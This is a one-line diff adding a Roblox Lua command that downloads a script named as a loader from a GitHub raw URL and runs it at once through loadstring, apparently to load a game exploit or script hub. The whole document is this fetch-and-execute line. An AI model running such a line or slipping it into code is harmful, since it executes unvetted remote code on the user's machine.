@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/x1mv/caracal.lua/main/loader.caracal"))()
